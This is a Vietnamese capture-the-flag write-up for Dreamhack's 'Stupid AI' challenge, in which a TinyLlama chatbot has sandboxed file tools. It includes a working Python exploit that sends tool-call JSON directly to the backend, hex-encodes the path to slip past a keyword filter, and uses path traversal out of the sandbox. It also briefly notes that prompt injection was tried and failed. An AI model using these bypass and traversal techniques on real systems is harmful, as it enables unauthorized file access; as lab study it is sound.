# Write-up: Stupid AI (Dreamhack CTF)

## Tóm Tắt

**Stupid AI** là một thử thách web yêu cầu người chơi tương tác với một chatbot AI để lấy cờ từ file `flag.txt` trên server. AI được trang bị các công cụ để tương tác với hệ thống file, nhưng bị giới hạn trong một sandbox. Lời giải cuối cùng không liên quan đến việc "thuyết phục" AI, mà là khai thác trực tiếp logic xử lý của backend bằng cách kết hợp lỗ hổng **Path Traversal** với cơ chế bypass bộ lọc được cung cấp sẵn.

---

## Giai Đoạn 1: Phân Tích Ban Đầu (Reconnaissance)

Khi phân tích các file được cung cấp (`app.py`, `Dockerfile`, `index.html`), chúng ta có thể rút ra các điểm chính sau:

1.  **Backend**: Một ứng dụng Flask (`app.py`) sử dụng mô hình ngôn ngữ TinyLlama được load cục bộ.
2.  **Chức Năng Chính**: Người dùng gửi tin nhắn, và AI sẽ trả lời. Điểm đặc biệt là AI có thể sử dụng các "công cụ" bằng cách tạo ra một chuỗi JSON có cấu trúc `{"tool": "...", "args": {...}}`.
3.  **Các Công Cụ Có Sẵn**:
    *   `read_file(path)`: Đọc nội dung file.
    *   `list_dir(path)`: Liệt kê các file và thư mục.
    *   `grep(path, pattern)`: Tìm kiếm một chuỗi trong file.
    *   `set_root(root)`: Thay đổi thư mục gốc của sandbox.
4.  **Cơ Chế Phòng Thủ**:
    *   **Sandbox**: Mọi thao tác file ban đầu bị giới hạn trong thư mục `/app/sandbox` thông qua hàm `_allowed()`.
    *   **Bộ Lọc Đầu Vào (`contains_secret_like`)**: Server sẽ từ chối xử lý nếu tin nhắn của người dùng chứa các từ khóa nhạy cảm như `flag`, `secret`, `dh{`, v.v.
    *   **Bộ Lọc Đầu Ra**: AI được cấu hình để tránh tạo ra các từ khóa nhạy cảm (`BAD_TOKEN_BIAS`), và output của nó cũng bị kiểm duyệt.
    *   **Cơ Chế "Khởi Động" (`BOOT_FIRST_TURN`)**: Server sẽ bỏ qua tin nhắn đầu tiên của người dùng và chỉ yêu cầu AI chào hỏi.

---

## Giai Đoạn 2: Những Con Đường Sai Lầm (The Rabbit Holes)

Bài toán này được thiết kế với nhiều cạm bẫy để đánh lạc hướng người chơi.

### Cạm Bẫy 1: Thuyết Phục AI (Prompt Injection)

Hướng tiếp cận tự nhiên nhất là cố gắng ra lệnh cho AI bằng ngôn ngữ tự nhiên. Tuy nhiên, cách này thất bại vì:
*   AI quá "ngu ngốc" và không đáng tin cậy, thường xuyên tạo ra các câu trả lời không liên quan.
*   Quan trọng hơn, có một cách khai thác trực tiếp và đáng tin cậy hơn mà không cần đến AI.

### Cạm Bẫy 2: `set_root` và Tính Phi Trạng Thái (Statelessness)

Khi phát hiện ra công cụ `set_root`, ý tưởng tiếp theo là:
1.  Gửi lệnh `set_root` để thay đổi thư mục gốc thành `/app/`.
2.  Gửi lệnh `read_file` để đọc `flag.txt`.

Cách này thất bại vì một nguyên tắc cốt lõi của các ứng dụng web hiện đại: **tính phi trạng thái**. Server web thường chạy nhiều tiến trình (worker) để xử lý các yêu cầu song song. Yêu cầu `set_root` có thể được xử lý bởi Worker A, thay đổi biến `ALLOWED_ROOT` trong bộ nhớ của Worker A. Nhưng yêu cầu `read_file` ngay sau đó lại có thể được xử lý bởi Worker B, nơi biến `ALLOWED_ROOT` vẫn là giá trị mặc định `/app/sandbox`. Do đó, việc thay đổi trạng thái của server giữa các yêu cầu là không thể. Công cụ `set_root` là một cái bẫy.

---

## Giai Đoạn 3: Lỗ Hổng Thực Sự và Con Đường Khai Thác

Sau khi loại bỏ các hướng đi sai, chúng ta tập trung vào logic xử lý của server.

### Điểm Mấu Chốt 1: Thực Thi Lệnh Trực Tiếp

Trong file `app.py`, hàm `maybe_exec_tool(user_msg)` được gọi **trước khi** tin nhắn được chuyển đến AI. Điều này có nghĩa là nếu chúng ta gửi một chuỗi JSON hợp lệ, server sẽ thực thi nó ngay lập tức và **hoàn toàn bỏ qua AI**. Đây là con đường tấn công chính.

### Điểm Mấu Chốt 2: Bypass Bộ Lọc Đầu Vào

Bộ lọc `contains_secret_like` ngăn chúng ta gửi các payload chứa chuỗi `"flag.txt"`. Tuy nhiên, hàm `_decode_pathish_fields` đã cố tình cung cấp một lối thoát:
```python
if "path_hex" in out and "path" not in out:
    out["path"] = bytes.fromhex(out.pop("path_hex")).decode(...)
```
Server cho phép chúng ta cung cấp đối số `path` dưới dạng mã hóa hex (`path_hex`). Bằng cách này, chuỗi JSON của chúng ta sẽ không chứa các từ khóa bị cấm, do đó vượt qua được bộ lọc.

### Điểm Mấu Chốt 3: Path Traversal

Vì `set_root` là một cái bẫy, chúng ta cần một cách để thoát khỏi sandbox `/app/sandbox` trong một yêu cầu duy nhất. Lỗ hổng nằm ở hàm kiểm tra quyền:
```python
def _allowed(p: Path) -> bool:
    return p.as_posix().startswith(ALLOWED_ROOT.as_posix())
```
Hàm này chỉ kiểm tra xem chuỗi đường dẫn có *bắt đầu* bằng `/app/sandbox` hay không. Nó không chuẩn hóa đường dẫn để xử lý các ký tự `..`. Đây là một lỗ hổng **Path Traversal** kinh điển.

Chúng ta có thể tạo ra một đường dẫn như sau: `/app/sandbox/../flag.txt`.
*   Chuỗi này vượt qua được hàm `_allowed` vì nó bắt đầu bằng `/app/sandbox`.
*   Khi được hệ điều hành xử lý, nó sẽ đi vào `/app/sandbox`, đi ngược ra một cấp (`..`) để vào `/app`, và cuối cùng truy cập `flag.txt`.

## Kế Hoạch Tấn Công Cuối Cùng

Kết hợp tất cả các phát hiện trên, chúng ta có một kế hoạch tấn công hoàn hảo trong một yêu cầu duy nhất:

1.  **Xây dựng payload Path Traversal**: `/app/sandbox/../flag.txt`.
2.  **Mã hóa payload**: Chuyển toàn bộ chuỗi trên sang dạng hex để bypass bộ lọc `contains_secret_like`.
3.  **Tạo lệnh JSON**: Tạo một lệnh `read_file` sử dụng đối số `path_hex` với giá trị đã mã hóa.
4.  **Gửi lệnh**: Gửi chuỗi JSON này trực tiếp đến server. Server sẽ thực thi lệnh, đọc file cờ và trả về nội dung mà không qua bất kỳ bộ lọc đầu ra nào.

## Exploit Script

```python
import requests
import json
import sys

TARGET_URL = "http://host1.dreamhack.games:20975"
CHAT_ENDPOINT = f"{TARGET_URL}/chat"

def send_command(payload: dict) -> dict:
    """Tạo một chuỗi JSON từ payload, gửi nó và trả về phản hồi JSON."""
    command_str = json.dumps(payload)
    post_data = {"message": command_str, "persona": ""}
    try:
        response = requests.post(CHAT_ENDPOINT, json=post_data, timeout=15)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"\n[!] Lỗi kết nối: {e}")
        sys.exit(1)

def main():
    
    # --- Tấn công trong một bước duy nhất ---
    print("[*] Xây dựng payload Path Traversal và mã hóa nó...")
    
    # Đường dẫn tấn công để bypass hàm _allowed
    traversal_path = "/app/sandbox/../flag.txt"
    
    # Mã hóa toàn bộ đường dẫn sang hex để bypass bộ lọc 'contains_secret_like'
    path_in_hex = traversal_path.encode('utf-8').hex()
    
    print(f"[+] Đường dẫn tấn công: {traversal_path}")
    print(f"[+] Đường dẫn được mã hóa hex: {path_in_hex}")
    
    # Tạo payload cuối cùng
    read_file_payload = {
        "tool": "read_file",
        "args": {
            "path_hex": path_in_hex
        }
    }
    
    print("\n[*] Gửi payload tấn công...")
    response_data = send_command(read_file_payload)
    
    if response_data.get("status") == "ok":
        flag = response_data.get("result", "").strip()
        if flag:
            print("\n[!] TẤN CÔNG THÀNH CÔNG!")
            print(f"[+] Flag: {flag}")
        else:
            print("[-] Lệnh thành công nhưng không nhận được nội dung cờ.")
    else:
        print(f"[-] Đọc file thất bại. Phản hồi từ server: {response_data}")

if __name__ == "__main__":
    main()
```

>Flag: `DH{Stupid_AI_LoLoL_UwUwU}`
---

### Kết Luận

**Stupid AI** là một thử thách được thiết kế xuất sắc, dạy cho chúng ta nhiều bài học quan trọng:
*   Luôn tìm kiếm các con đường khai thác trực tiếp thay vì phụ thuộc vào các thành phần không đáng tin cậy như AI.
*   Hiểu rõ về tính phi trạng thái của ứng dụng web để không bị rơi vào bẫy thay đổi trạng thái server.
*   Các lỗ hổng web kinh điển như Path Traversal vẫn luôn tồn tại và có thể được che giấu dưới các lớp logic hiện đại.
*   Đọc kỹ mã nguồn là chìa khóa để tìm ra các cơ chế bypass được người ra đề cố tình để lại.